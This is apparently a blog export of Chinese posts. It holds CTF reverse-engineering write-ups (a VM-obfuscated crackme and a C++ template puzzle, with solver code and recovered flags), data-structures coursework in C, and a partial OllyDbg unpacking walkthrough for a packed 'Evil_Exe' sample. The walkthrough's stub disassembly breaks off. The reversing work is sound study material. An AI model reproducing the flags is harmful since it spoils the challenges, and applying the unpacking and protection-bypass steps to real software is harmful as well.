动态调试后可知程序把大量的汇编代码通过这样的方式混淆了，然后再通过操作码来读取对应的功能。 000401270 loc_401270: ; CODE XREF: main+78↑j.text:0000000000401270 lea rdi, [rbp+s].text:0000000000401274 mov rax, offset aJ ; &quot;J&quot;.text:000000000040127E mov ecx, 90h.text:0000000000401283 mov edx, ecx ; n.text:0000000000401285 lea rsi, [rbp+dest].text:000000000040128C mov [rbp+var_198], rdi.text:0000000000401293 mov rdi, rsi ; dest.text:0000000000401296 mov rsi, rax ; src.text:0000000000401299 call _memcpy.text:000000000040129E mov rdi, [rbp+var_198] ; char *.text:00000000004012A5 call _Z10fun_check1Pc ; fun_check1(char *).text:00000000004012AA mov ecx, 916CBF8Ch.text:00000000004012AF mov r8d, 70B25450h.text:00000000004012B5 test al, 1.text:00000000004012B7 cmovnz ecx, r8d.text:00000000004012BB mov [rbp+var_154], ecx.text:00000000004012C1 jmp loc_4013B3.text:00000000004012C6 ; ---------------------------------------------------------------------------.text:00000000004012C6.text:00000000004012C6 loc_4012C6: ; CODE XREF: main+190↑j.text:00000000004012C6 lea rdi, [rbp+s] ; char *.text:00000000004012CA call _Z10fun_check2Pc ; 检测格式.text:00000000004012CF mov ecx, 916CBF8Ch.text:00000000004012D4 mov edx, 48DC1E73h.text:00000000004012D9 test al, 1.text:00000000004012DB cmovnz ecx, edx.text:00000000004012DE mov [rbp+var_154], ecx.text:00000000004012E4 jmp loc_4013B3.text:00000000004012E9 ; ---------------------------------------------------------------------------.text:00000000004012E9.text:00000000004012E9 loc_4012E9: ; CODE XREF: main+174↑j.text:00000000004012E9 lea rdi, [rbp+s] ; char *.text:00000000004012ED call _Z10fun_check3Pc ; 限制格式.text:00000000004012F2 mov ecx, 916CBF8Ch.text:00000000004012F7 mov edx, 9FDEA8ECh.text:00000000004012FC test al, 1.text:00000000004012FE cmovnz ecx, edx.text:0000000000401301 mov [rbp+var_154], ecx.text:0000000000401307 jmp loc_4013B3.text:000000000040130C ; ---------------------------------------------------------------------------.text:000000000040130C.text:000000000040130C loc_40130C: ; CODE XREF: main+B0↑j.text:000000000040130C lea rdi, [rbp+s] ; char *.text:0000000000401310 call _Z10fun_check4Pc ; 检查格式.text:0000000000401315 mov ecx, 916CBF8Ch.text:000000000040131A mov edx, 0CDC4B0D0h.text:000000000040131F test al, 1.text:0000000000401321 cmovnz ecx, edx.text:0000000000401324 mov [rbp+var_154], ecx.text:000000000040132A jmp loc_4013B3.text:000000000040132F ; ---------------------------------------------------------------------------.text:000000000040132F.text:000000000040132F loc_40132F: ; CODE XREF: main+104↑j.text:000000000040132F lea rsi, [rbp+dest] ; int *.text:0000000000401336 lea rdi, [rbp+var_B0] ; char *.text:000000000040133D call _Z10fun_check5PcPi ; fun_check5(char *,int *).text:0000000000401342 mov ecx, 916CBF8Ch.text:0000000000401347 mov edx, 0F465F43Bh.text:000000000040134C test al, 1.text:000000000040134E cmovnz ecx, edx.text:0000000000401351 mov [rbp+var_154], ecx.text:0000000000401357 jmp loc_4013B3 check1~5是整个程序的核心部分，其中check1 ~check4都是对flag格式的限制 我们只需要将call checkx 打上断点，在这个call执行完成之后，观察al的值即可判断格式是否符合要求，最终发现flag的格式是flag{}，总长度共42. 最重要的是check5函数，其中 .text:0000000000400D90 loc_400D90: ; CODE XREF: fun_check5(char *,int *)+E9↑j.text:0000000000400D90 mov eax, 0B92BF994h.text:0000000000400D95 mov ecx, 0AC151DE7h.text:0000000000400D9A mov rdx, [rbp+var_10].text:0000000000400D9E movsxd rsi, [rbp+var_E4].text:0000000000400DA5 movsx edi, byte ptr [rdx+rsi] ; 读取下一个字符.text:0000000000400DA9 cmp edi, 30h.text:0000000000400DAC cmovge eax, ecx.text:0000000000400DAF mov [rbp+var_E8], eax.text:0000000000400DB5 jmp loc_40102D.text:0000000000400DBA ; ---------------------------------------------------------------------------.text:0000000000400DBA.text:0000000000400DBA loc_400DBA: ; CODE XREF: fun_check5(char *,int *)+79↑j.text:0000000000400DBA mov eax, 0B92BF994h.text:0000000000400DBF mov ecx, 0E37ECC40h.text:0000000000400DC4 mov rdx, [rbp+var_10].text:0000000000400DC8 movsxd rsi, [rbp+var_E4].text:0000000000400DCF movsx edi, byte ptr [rdx+rsi].text:0000000000400DD3 cmp edi, 39h ; 判断是否为数字.text:0000000000400DD6 cmovle eax, ecx.text:0000000000400DD9 mov [rbp+var_E8], eax.text:0000000000400DDF jmp loc_40102D.text:0000000000400DE4 ; ---------------------------------------------------------------------------.text:0000000000400DE4.text:0000000000400DE4 loc_400DE4: ; CODE XREF: fun_check5(char *,int *)+159↑j.text:0000000000400DE4 mov rax, [rbp+var_10].text:0000000000400DE8 movsxd rcx, [rbp+var_E4].text:0000000000400DEF movsx edx, byte ptr [rax+rcx].text:0000000000400DF3 sub edx, 1D854A80h.text:0000000000400DF9 add edx, 11h.text:0000000000400DFC add edx, 1D854A80h.text:0000000000400E02 movsxd rax, [rbp+var_E4].text:0000000000400E09 mov [rbp+rax*4+var_E0], edx.text:0000000000400E10 mov [rbp+var_E8], 72D256E3h.text:0000000000400E1A jmp loc_40102D 如果输入是数字，就将数字转换为对应的大写字母 .text:0000000000400E1F loc_400E1F: ; CODE XREF: fun_check5(char *,int *)+B1↑j.text:0000000000400E1F mov eax, 966647E9h.text:0000000000400E24 mov ecx, 0BA6BE5FDh.text:0000000000400E29 mov rdx, [rbp+var_10].text:0000000000400E2D movsxd rsi, [rbp+var_E4].text:0000000000400E34 movsx edi, byte ptr [rdx+rsi].text:0000000000400E38 cmp edi, 2Dh.text:0000000000400E3B cmovz eax, ecx.text:0000000000400E3E mov [rbp+var_E8], eax.text:0000000000400E44 jmp loc_40102D ‘-‘符号不作处理 .text:0000000000400E75 loc_400E75: ; CODE XREF: fun_check5(char *,int *)+41↑j.text:0000000000400E75 mov eax, 67B6BD28h.text:0000000000400E7A mov ecx, 0B80842FBh.text:0000000000400E7F mov rdx, [rbp+var_10].text:0000000000400E83 movsxd rsi, [rbp+var_E4].text:0000000000400E8A movsx edi, byte ptr [rdx+rsi].text:0000000000400E8E cmp edi, 61h.text:0000000000400E91 cmovge eax, ecx.text:0000000000400E94 mov [rbp+var_E8], eax.text:0000000000400E9A jmp loc_40102D.text:0000000000400E9F ; ---------------------------------------------------------------------------.text:0000000000400E9F.text:0000000000400E9F loc_400E9F: ; CODE XREF: fun_check5(char *,int *)+95↑j.text:0000000000400E9F mov eax, 67B6BD28h.text:0000000000400EA4 mov ecx, 7CFC4F40h.text:0000000000400EA9 mov rdx, [rbp+var_10].text:0000000000400EAD movsxd rsi, [rbp+var_E4].text:0000000000400EB4 movsx edi, byte ptr [rdx+rsi].text:0000000000400EB8 cmp edi, 7Ah.text:0000000000400EBB cmovle eax, ecx.text:0000000000400EBE mov [rbp+var_E8], eax.text:0000000000400EC4 jmp loc_40102D.text:0000000000400EC9 ; ---------------------------------------------------------------------------.text:0000000000400EC9.text:0000000000400EC9 loc_400EC9: ; CODE XREF: fun_check5(char *,int *)+271↑j.text:0000000000400EC9 mov rax, [rbp+var_10].text:0000000000400ECD movsxd rcx, [rbp+var_E4].text:0000000000400ED4 movsx edx, byte ptr [rax+rcx].text:0000000000400ED8 sub edx, 50577E63h.text:0000000000400EDE sub edx, 30h.text:0000000000400EE1 add edx, 50577E63h.text:0000000000400EE7 movsxd rax, [rbp+var_E4].text:0000000000400EEE mov [rbp+rax*4+var_E0], edx.text:0000000000400EF5 mov [rbp+var_E8], 67B6BD28h.text:0000000000400EFF jmp loc_40102D 如果是字母就转换为数字 最后在转换完成的字符串上面下一个内存断点，就可找到这个字符串与目标加密字符串比较的过程 加密字符串： flag{J2261C63-3I2I-EGE4-IBCC-IE41A5I5F4HB} 解密即可。 en c = \"J2261C63-3I2I-EGE4-IBCC-IE41A5I5F4HB\"flag = \"flag&#123;\"for c in enc: if c == '-': fuck = 0 elif c &gt;= 'A' and c &lt;= 'J': c = chr(ord(c) - 0x11) else: c = chr(ord(c) + 48) flag = flag + cflag += '&#125;'print(flag)","categories":[{"name":"write-up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"nisc-20190815","slug":"write-up/nisc-20190815","permalink":"https://mrh1s.top/categories/write-up/nisc-20190815/"}],"tags":[{"name":"VM","slug":"VM","permalink":"https://mrh1s.top/tags/VM/"}],"author":"mrh929"},{"title":"nisc-src_leak","slug":"src-leak","date":"2019-08-18T10:44:38.000Z","updated":"2019-08-18T10:49:29.128Z","comments":true,"path":"posts/9455f959/","link":"","permalink":"https://mrh1s.top/posts/9455f959/","excerpt":"","text":"src_leaksrc_leak_2886f9ce0464ae67bbeb52d939c9979d.zip 没学过c++语法，看这些东西看蒙了 就大概猜了一下，发现算法流程并不是很复杂 x1~x5都是用一个函数跑出来的 x6用另一个 cout &lt;&lt; func3&lt; func2&lt;x1&gt; &gt; &lt;&lt; endl;cout &lt;&lt; func3&lt; func2&lt;x2&gt; &gt; &lt;&lt; endl;cout &lt;&lt; func3&lt; func2&lt;x3&gt; &gt; &lt;&lt; endl;cout &lt;&lt; func3&lt; func2&lt;x4&gt; &gt; &lt;&lt; endl;cout &lt;&lt; func3&lt; func2&lt;x5&gt; &gt; &lt;&lt; endl;// output: 1 1 1 1 1cout &lt;&lt; _func1&lt;x1&gt;::result &lt;&lt; endl;cout &lt;&lt; _func1&lt;x2&gt;::result &lt;&lt; endl;cout &lt;&lt; _func1&lt;x3&gt;::result &lt;&lt; endl;cout &lt;&lt; _func1&lt;x4&gt;::result &lt;&lt; endl;cout &lt;&lt; _func1&lt;x5&gt;::result &lt;&lt; endl;//output: 963 4396 6666 1999 3141 说几个比较关键的地方 template &lt;bool Flag, class MaybeA, class MaybeB&gt; class IfElse;template &lt;class MaybeA, class MaybeB&gt;class IfElse&lt;true, MaybeA, MaybeB&gt; &#123;public: using ResultType = MaybeA;&#125;;template &lt;class MaybeA, class MaybeB&gt;class IfElse&lt;false, MaybeA, MaybeB&gt; &#123;public: using ResultType = MaybeB; 看起来这么大一堆，实际上就表达了一个意思 result = flag ? MaybeA:MaybeB template &lt;uint N, uint L&gt; struct func1&lt;N, L, L&gt; &#123; enum &#123; result = L &#125;; &#125;;template&lt;&gt;constexpr size_t func2&lt;0&gt; = 0;template&lt;uint m&gt;struct TEST&lt;0, m&gt; &#123; const static uint value = 0;&#125;;template&lt;uint n&gt;struct TEST&lt;n, 0&gt; &#123; const static uint value = 1;&#125;;template&lt;&gt;struct func4&lt;1&gt; &#123; const static uint value = 0;&#125;;template&lt;&gt;struct func4&lt;2&gt; &#123; const static uint value = 1;&#125;; 以上是各个函数的边界条件，一定不能省略，否则跑不出来或者跑出来不对，尤其是func4的1和2 因为c的执行效率比较高，抱着试一试的心态，写了个暴力算法进行求解，在int范围下尝试失败（因为涉及到了数据的平方，int类型会溢出），于是更换为long long 进行求解，虽然效率不高，但还是可以在十秒中左右得出结果。 #include&lt;cstdio&gt;typedef long long LL;LL func2(LL n)&#123; if(n==0) return 0; return n%2 + func2(n/2);&#125;LL func3(LL n)&#123; return n%2;&#125;LL func1(LL n, LL l, LL r)&#123; if(l==r) return l; LL mid = (l+r+1)/2; if(n &lt; mid*mid) return func1(n,l,mid-1); else return func1(n,mid,r);&#125;LL _func1(LL n)&#123; return func1(n,1,n);&#125;LL nextn(LL n, LL m)&#123; return ((n % m != 0) * n);&#125;LL nextm(LL n, LL m)&#123; return (m * m &lt;= n ? (m + 1) : 0);&#125;LL test(LL n,LL m)&#123; if(n == 0) return 0; if(m == 0) return 1; return test(nextn(n,m) , nextm(n,m));&#125;LL func4(LL n)&#123; if(n==1) return 0; if(n==0) return 1; return test(n,2);&#125;int main()&#123; /************ x1 ~ x5 //input: 963 4396 6666 1999 3141 // ans = 1927 8792 13332 3998 6282 **********/ LL input[] = &#123;963,4396,6666,1999,3141&#125;; printf(\"flag&#123;\"); for(LL j = 0; j&lt;=4 ; j++)&#123; LL ans = input[j]; for(LL i=0;i&lt;=300000000;i++)&#123; if(func3(func2(i))==1) if(_func1(i) == ans)&#123; printf(\"%lld\",i); break; &#125; /* if(i % 100000 == 0) printf(\"%d finished\\n\",i);*/ &#125; printf(\"-\"); &#125; /************ x6 = 1229 **********/ LL cnt=1; for(LL i=3;i&lt;=10000;i++) if(func4(i)==1) cnt++; printf(\"%lld&#125;\",cnt); //flag&#123;927369-19324816-44435556-3996001-9865881-1229&#125;&#125;","categories":[{"name":"write-up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"nisc-20190815","slug":"write-up/nisc-20190815","permalink":"https://mrh1s.top/categories/write-up/nisc-20190815/"}],"tags":[],"author":"mrh929"},{"title":"期末大作业_二叉树的存储与图的最短路径","slug":"BinaryTree-ShortestPath","date":"2019-06-14T12:51:14.000Z","updated":"2019-06-20T05:03:32.037Z","comments":true,"path":"posts/36f51c45/","link":"","permalink":"https://mrh1s.top/posts/36f51c45/","excerpt":"","text":"正文 实验报告 exp1主要学习了一下递归函数的非递归写法 随机生成一棵树写得我很爽 #include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;ctime&gt;#include&lt;stack&gt;using namespace std;int FLAG;struct BT&#123; char data; BT *lch, *rch; int process;//记录当前递归到左子树还是右子树 &#125;;void Free_BT(BT *rt)&#123; if(rt == NULL) return; Free_BT(rt-&gt;lch); Free_BT(rt-&gt;rch); free(rt);&#125;BT *Generate_BT(int now, int mind, int maxd)&#123;//随机生成一棵二叉树 BT *rt = NULL; if((rand()%10 &gt; 3)&amp;&amp;(now &lt;= maxd) || (now &lt; mind) )&#123; rt = (BT*) malloc(sizeof(BT)); rt-&gt;data = (rand()%26) + 'a'; rt-&gt;lch = Generate_BT(now+1, mind, maxd); rt-&gt;rch = Generate_BT(now+1, mind, maxd); &#125; return rt;&#125;void Print_Manu()&#123; printf(\"1.采用二叉链式存储创建二叉树B1\\n\"); printf(\"2.采用先序序列化显示输出序列，并存储到文件中\\n\"); printf(\"3.从文件中读出序列，并反序列化的递归方法构造二叉树B2\\n\"); printf(\"4.从文件中读出序列，并反序列化的非递归方法构造二叉树B3\\n\"); printf(\"5.使用非递归的方法输出二叉树的中序遍历序列\\n\"); printf(\"6.使用非递归的方法输出二叉树的后序遍历序列\\n\"); printf(\"7.销毁释放二叉树B1,B2,B3\\n\"); printf(\"0.退出\\n\\n\");&#125;void Dot_f(FILE *f)&#123; if(FLAG)&#123; printf(\",\"); fprintf(f, \",\"); &#125;else FLAG = 1;&#125;void Dot()&#123; if(FLAG)&#123; printf(\",\"); &#125;else FLAG = 1;&#125;char Read_node(FILE *f)&#123; char c; do&#123; fscanf(f, \"%c\", &amp;c); &#125;while(c == ','); return c;&#125;void Pre_Order(BT *rt, FILE *f)&#123;//先序遍历显示输出序列 Dot_f(f); if(rt == NULL)&#123; printf(\"#\"); fprintf(f, \"#\"); return; &#125; printf(\"%c\", rt-&gt;data); fprintf(f, \"%c\", rt-&gt;data); Pre_Order(rt-&gt;lch, f); Pre_Order(rt-&gt;rch, f); &#125;BT *Deserialize_RE(FILE *f)&#123;//递归反序列化 BT *rt = NULL; char c = Read_node(f); if(c == '#') return rt; rt = (BT*) malloc(sizeof(BT)); rt-&gt;data = c; rt-&gt;lch = Deserialize_RE(f); rt-&gt;rch = Deserialize_RE(f); return rt;&#125;BT *Deserialize_NOT(FILE *f)&#123;//非递归反序列化 stack&lt;BT*&gt; mystack; BT *rt = NULL; BT *ret; char c = Read_node(f); if(c == '#') return rt; rt = (BT*) malloc(sizeof(BT)); rt-&gt;process = 1; rt-&gt;data = c; mystack.push(rt); while(mystack.empty() == 0)&#123; BT *t = mystack.top(); if(t-&gt;process == 0)&#123;//验证该结点是否存在 t-&gt;data = Read_node(f); if(t-&gt;data == '#')&#123;//结点不存在 free(t); ret = NULL; mystack.pop(); continue; &#125;else&#123;//结点存在 t-&gt;process += 1; continue; &#125; &#125;else if(t-&gt;process == 1)&#123;//左子树 t-&gt;lch = (BT*) malloc(sizeof(BT)); mystack.push(t-&gt;lch); t-&gt;lch-&gt;process = 0; t-&gt;process += 1; continue; &#125;else if(t-&gt;process == 2)&#123;//右子树 t-&gt;lch = ret; t-&gt;rch = (BT*) malloc(sizeof(BT)); mystack.push(t-&gt;rch); t-&gt;rch-&gt;process = 0; t-&gt;process += 1; continue; &#125;else&#123;//返回 t-&gt;rch = ret; mystack.pop(); ret = t; continue; &#125; &#125; return rt;&#125;void In_Order(BT *rt)&#123; stack&lt;BT*&gt; mystack; BT *p; p = rt; while(mystack.empty()==0 || p!=NULL)&#123; while(p != NULL)&#123;//循环找到最左边的叶子 mystack.push(p); p = p-&gt;lch; &#125; Dot(); printf(\"#,\"); if(mystack.empty() == 0)&#123;//输出该叶子并且回退，然后找到最邻近的右儿子 p = mystack.top(); mystack.pop(); printf(\"%c\", p-&gt;data); p = p-&gt;rch; &#125; &#125; Dot(); printf(\"#\");&#125;void Post_Order(BT *rt)&#123; stack&lt;BT*&gt; mystack; BT *p; if(rt == NULL)&#123; printf(\"#\"); return; &#125; mystack.push(rt); rt-&gt;process = 0; while(mystack.empty() == 0)&#123; p = mystack.top(); if(p-&gt;process == 0)&#123; if(p == NULL)&#123; Dot(); printf(\"#\"); mystack.pop(); continue; &#125;else&#123; if(p-&gt;lch == NULL)&#123; Dot(); printf(\"#\"); &#125;else&#123; mystack.push(p-&gt;lch); p-&gt;lch-&gt;process = 0; &#125; p-&gt;process += 1; continue; &#125; &#125;else if(p-&gt;process == 1)&#123; if(p-&gt;rch == NULL)&#123; Dot(); printf(\"#\"); &#125;else&#123; mystack.push(p-&gt;rch); p-&gt;rch-&gt;process = 0; &#125; p-&gt;process += 1; continue; &#125;else&#123; Dot(); printf(\"%c\", p-&gt;data); mystack.pop(); continue; &#125; &#125;&#125;int main()&#123; srand(time(NULL)); BT *b1 = NULL; BT *b2 = NULL; BT *b3 = NULL; int Choice; FILE *f; Print_Manu(); while(1)&#123; printf(\"Input your choice:\"); scanf(\"%d\", &amp;Choice); if(!Choice) break; switch(Choice)&#123; case 1:&#123; int mind, maxd; printf(\"Input the minimum depth:\"); scanf(\"%d\", &amp;mind); printf(\"Input the maximum depth:\"); scanf(\"%d\", &amp;maxd); if(mind &gt; maxd)&#123; printf(\"Invalid!\\n\\n\"); continue; &#125; Free_BT(b1); //把之前储存的树销毁 b1 = Generate_BT(1, mind, maxd); printf(\"Binary tree generated.\\n\\n\"); break; &#125; case 2:&#123; f = fopen(\"tree.txt\", \"w\"); printf(\"serialization_pre_order:\"); FLAG = 0; Pre_Order(b1, f); fclose(f); printf(\"\\n\\n\"); break; &#125; case 3:&#123; f = fopen(\"tree.txt\", \"r\"); b2 = Deserialize_RE(f); fclose(f); printf(\"Succeeded to load in_order tree to b2.\\n\\n\"); break; &#125; case 4:&#123; f = fopen(\"tree.txt\", \"r\"); b3 = Deserialize_NOT(f); fclose(f); printf(\"Succeeded to load post_order tree to b3.\\n\\n\"); break; &#125; case 5:&#123; printf(\"serialization_in_order:\"); FLAG = 0; In_Order(b2); printf(\"\\n\\n\"); break; &#125; case 6:&#123; printf(\"serialization_post_order:\"); FLAG = 0; Post_Order(b3); printf(\"\\n\\n\"); break; &#125; case 7:&#123; Free_BT(b1); Free_BT(b2); Free_BT(b3); b1 = b2 = b3 = NULL; printf(\"Succeeded to free b1,b2,b3!\\n\\n\"); break; &#125; &#125; &#125;&#125; exp2dijkstra算法以及Floyd算法保存最短路径的方法 dijkstra：在每次加入新点到集合中时，把这些点的father记为上一个点，最后一起逆序输出 Floyd：在进行三重循环的时候，如果找到了最短路（i到j中有一个k结点）， 那么就把”path(i)(j)”改为”path(i)(k)”，意味着从i到j的最短路上，i的下一个结点是 i到k的最短路上i的下一个结点 这句话好好理解一下（是一种递归定义，无限递归后，最终path(i)(j)就是i到j最短路上i的下一个节点） 参考资料：https://blog.csdn.net/weixin_39956356/article/details/80620667 #include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;ctime&gt;#include&lt;cstring&gt;#include&lt;stack&gt;#include&lt;iostream&gt;#define MAX 500#define INF 1e9+7 using namespace std;int map[MAX+1][MAX+1], n;int shortest[MAX+1][MAX+1];int dist[MAX+1],path[MAX+1][MAX+1]; //path数组负责记录从u到v，以u为起点的下一个结点的位置 char name[MAX+1][20];int fa[MAX+1];//用于在dijkstra里面保存某个结点的前一个结点 void Print_Manu()&#123; printf(\"1.Import a map.(and store it in the disk)\\n\"); printf(\"2.Calculate the shortest distance from a to b.\\n\"); printf(\"3.Calculate the shortest route of all.(and store it in the disk)\\n\"); printf(\"4.import the map from disk and output the shortest route between two locations.\\n\"); printf(\"0.Quit.\\n\");&#125;void Input_Map(int n)&#123; printf(\"input names:\\n\"); for(int i = 1; i &lt;= n; i++)&#123; printf(\"No.%d:\", i); scanf(\"%s\", name[i]); &#125; for(int i = 1; i &lt;= n; i++) for(int j = 1; j &lt;= n; j++) map[i][j] = INF; for(int i = 1; i &lt;= n; i++)&#123; for(int j = i+1; j &lt;= n; j++)&#123; int t; printf(\"From %s to %s (-1 stands for infinite):\", name[i], name[j]); scanf(\"%d\",&amp;t); if(t == -1) continue;//距离无限远 map[i][j] = map[j][i] = t; &#125; map[i][i] = 0; &#125;&#125;int Search_Id(char str[])&#123; for(int i = 1; i &lt;= n; i++) if(strcmp(name[i], str)==0) return i; return -1;&#125;int Dijkstra(int s, int t)&#123; for(int i = 1; i &lt;= n; i++) map[i][i] = 0;//要把所有的结点首先剔除S集合 map[s][s] = 1; for(int i = 1; i &lt;= n; i++)&#123;//将s的邻接点加入dist dist[i] = INF; fa[i] = i; if(map[s][i] &lt; INF)&#123; dist[i] = map[s][i]; fa[i] = s; &#125; &#125; for(int i = 1; i &lt;= n-1; i++)&#123;//循环n-1次 int MIN = INF, u = 0; for(int j = 1; j &lt;= n; j++)&#123;//在剩下的点中找一个与S集合邻接的，距离s点最短的点 if(map[j][j] == 0 &amp;&amp; dist[j]&lt;MIN)&#123; u = j; MIN = dist[j]; &#125; &#125; map[u][u] = 1;//加入这个点到S集合中 for(int j = 1; j &lt;= n; j++) if(map[j][j] == 0)//找到了u点，接下来把与u点邻接的所有边更新一下 if(map[u][j] &lt; INF &amp;&amp; dist[u] + map[u][j] &lt; dist[j])&#123; dist[j] = dist[u] + map[u][j]; fa[j] = u;//把j的父亲设为u &#125; &#125; return dist[t];//返回距离 &#125;void Floyd()&#123; for(int i = 1; i &lt;= n; i++) for(int j = 1; j &lt;= n; j++) path[i][j] = j;//初始化path数组 memcpy(shortest, map, sizeof(map)); for(int k = 1; k &lt;= n; k++) for(int i = 1; i &lt;= n; i++) for(int j = 1; j &lt;= n; j++) if(shortest[i][j] &gt; shortest[i][k] + shortest[k][j])&#123; shortest[i][j] = shortest[i][k] + shortest[k][j]; path[i][j] = path[i][k];//代表i到j的路径上，i的下一个结点为k //重要 这段代码值得好好理解 &#125;&#125;int main()&#123; Print_Manu(); int Choice; FILE *f; do&#123; printf(\"\\n\\ninput optcode:\"); scanf(\"%d\", &amp;Choice); switch(Choice)&#123; case 1:&#123; printf(\"\\ninput n:\"); scanf(\"%d\", &amp;n); Input_Map(n); printf(\"Succeeded to import a map!\\n\\n\"); break; &#125; case 2:&#123; printf(\"input two names(separate with a space):\\n\"); char name1[20], name2[20]; int s, t; scanf(\"%s%s\", name1, name2); s = Search_Id(name1); t = Search_Id(name2); if(s &lt; 0 || t &lt; 0) printf(\"Invalid name!\\n\"); else&#123; int res = Dijkstra(s, t); printf(\"The shortest distance is %d\\n\", res); if(res == INF) printf(\"which means no path.\\n\"); else&#123; printf(\"path: \"); int k = t; stack &lt;int&gt; mystack; while(k != s)&#123; mystack.push(k); k = fa[k]; &#125; printf(\"%s \", name[s]); while(mystack.empty() != 1)&#123; printf(\"-&gt; %s \", name[mystack.top()]); mystack.pop(); &#125; printf(\"\\n\"); &#125; &#125; break; &#125; case 3:&#123; f = fopen(\"AllPath.dat\", \"w\"); Floyd(); printf(\"All the shortest distance:\\n\"); fprintf(f, \"%d\\n\", n); for(int i = 1; i &lt;= n; i++) fprintf(f, \"%s \", name[i]); fprintf(f, \"\\n\"); for(int i = 1; i &lt;= n; i++) for(int j = i+1; j &lt;= n; j++)&#123; printf(\"from %s to %s: %d\\n\", name[i], name[j], shortest[i][j]); fprintf(f, \"%s %s %d\\n\", name[i], name[j], shortest[i][j]); if(shortest[i][j] == INF)//没有路径 printf(\"which means no path.\\n\"); else&#123; printf(\"path: \"); int k = i; while(k != j)&#123; printf(\" %s -&gt;\", name[k]); k = path[k][j]; &#125; printf(\" %s\\n\",name[j]); &#125; &#125; //以下是记录两个节点的最短路径与之间的距离 for(int i = 1; i &lt;= n; i++)&#123; for(int j = 1; j &lt;= n; j++) fprintf(f, \"%d \", map[i][j]); fprintf(f, \"\\n\"); &#125; for(int i = 1; i &lt;= n; i++)&#123; for(int j = 1; j &lt;= n; j++) fprintf(f, \"%d \", path[i][j]); fprintf(f, \"\\n\"); &#125; fclose(f); break; &#125; case 4:&#123; char name1[20], name2[20]; int t; f = fopen(\"AllPath.dat\", \"r\"); fscanf(f, \"%d\", &amp;n); for(int i = 1; i &lt;= n; i++) fscanf(f, \"%s\", name[i]); for(int i = 1; i &lt;= n*(n-1)/2; i++)&#123; fscanf(f, \"%s %s %d\", name1, name2, &amp;t); shortest[Search_Id(name1)][Search_Id(name2)] = t; shortest[Search_Id(name2)][Search_Id(name1)] = t; &#125; //以下是读取两个节点的最短路径与之间的距离 for(int i = 1; i &lt;= n; i++) for(int j = 1; j &lt;= n; j++) fscanf(f, \"%d \", &amp;map[i][j]); for(int i = 1; i &lt;= n; i++) for(int j = 1; j &lt;= n; j++) fscanf(f, \"%d \", &amp;path[i][j]); printf(\"All the locations:\\n\"); for(int i = 1; i &lt;= n; i++) printf(\"%s \",name[i]); printf(\"\\ninput two locations:\"); scanf(\"%s%s\",name1,name2); int u = Search_Id(name1); int v = Search_Id(name2); if(u==-1 || v==-1) printf(\"Invalid name!\\n\"); else printf(\"from %s to %s is %d\\n\", name1, name2, shortest[u][v]); if(shortest[u][v]==INF) printf(\"which means no path.\\n\"); else&#123; printf(\"path: \"); int k = u; while(k != v)&#123; printf(\" %s -&gt;(%d)-&gt; \", name[k], map[k][path[k][v]]); k = path[k][v]; &#125; printf(\" %s\\n\",name[v]); &#125; fclose(f); break; &#125; &#125; &#125;while(Choice);&#125;","categories":[{"name":"project","slug":"project","permalink":"https://mrh1s.top/categories/project/"}],"tags":[],"author":"mrh929"},{"title":"JarvisOJ_DD_Evil_Exe","slug":"DD-Evil-Exe","date":"2019-06-13T16:10:40.000Z","updated":"2019-06-17T08:57:53.191Z","comments":true,"path":"posts/db7ddaa/","link":"","permalink":"https://mrh1s.top/posts/db7ddaa/","excerpt":"","text":"Evil_Exe(not totallly succeeded) DD_Evil_Exe.7z 思路 程序双击打开后什么都没有发生，然后exe文件被删除了，取而代之的是一个docx文件 用ida打开该文件，显示无法翻译，怀疑使用了壳进行加密 查壳用peid去查询壳类型 显示是yoda’s Protector，使用对应的脱壳器进行脱壳，失败 去壳用ollydbg手动去壳： 0x0043DCA8处是一个pushad，经过调试，程序会在此反复地pushad+popad地循环，所以直接设置eip至0x0043DCA2 0043DC85 &gt; $ 56 push esi ; evil.&lt;ModuleEntryPoint&gt;0043DC86 . E8 00000000 call evil.0043DC8B0043DC8B $ 5E pop esi ; kernel32.76B804190043DC8C . B8 90110000 mov eax,0x11900043DC91 . 81EE 8B8C0000 sub esi,0x8C8B0043DC97 &gt; E8 0C000000 call evil.0043DCA80043DC9C . 83C6 08 add esi,0x80043DC9F . 48 dec eax0043DCA0 .^ 75 F5 jnz short evil.0043DC970043DCA2 . 5E pop esi ; kernel32.76B804190043DCA3 .^ E9 08FEFFFF jmp evil.0043DAB00043DCA8 /$ 60 pushad0043DCA9 |. 56 push esi ; evil.&lt;ModuleEntryPoint&gt;0043DCAA |. AD lods dword ptr ds:[esi]0043DCAB |. 93 xchg eax,ebx0043DCAC |. AD lods dword ptr ds:[esi]0043DCAD |. 92 xchg eax,edx ; evil.&lt;ModuleEntryPoint&gt;0043DCAE |. BF 74713414 mov edi,0x143471740043DCB3 |. BD 34443144 mov ebp,0x443144340043DCB8 |. B9 AC174798 mov ecx,0x984717AC0043DCBD |. BE 15DCE8AF mov esi,0xAFE8DC150043DCC2 |. 33C0 xor eax,eax0043DCC4 |&gt; C1CB 08 /ror ebx,0x80043DCC7 |. 03DA |add ebx,edx ; evil.&lt;ModuleEntryPoint&gt;0043DCC9 |. 33DF |xor ebx,edi ; evil.&lt;ModuleEntryPoint&gt;0043DCCB |. C1C2 03 |rol edx,0x30043DCCE |. 33D3 |xor edx,ebx0043DCD0 |. C1CD 08 |ror ebp,0x80043DCD3 |. 03EF |add ebp,edi ; evil.&lt;ModuleEntryPoint&gt;0043DCD5 |. 33E8 |xor ebp,eax0043DCD7 |. C1C7 03 |rol edi,0x30043DCDA |. 33FD |xor edi,ebp0043DCDC |. 87F1 |xchg ecx,esi ; evil.&lt;ModuleEntryPoint&gt;0043DCDE |. 87F5 |xchg ebp,esi ; evil.&lt;ModuleEntryPoint&gt;0043DCE0 |. 40 |inc eax0043DCE1 |. 3C 1B |cmp al,0x1B0043DCE3 |.^ 75 DF \\jnz short evil.0043DCC40043DCE5 |. 5F pop edi ; kernel32.76B804190043DCE6 |. 93 xchg eax,ebx0043DCE7 |. AB stos dword ptr es:[edi]0043DCE8 |. 92 xchg eax,edx ; evil.&lt;ModuleEntryPoint&gt;0043DCE9 |. AB stos dword ptr es:[edi]0043DCEA |. 61 popad0043DCEB \\. C3 retn 来到此处，又看到一个pushad，但是这个pushad后面的popad是找不到了，最好使用esp定律来寻找popad 按一下F8，并记录下esp的值 0x0019FF54 0043DAB0 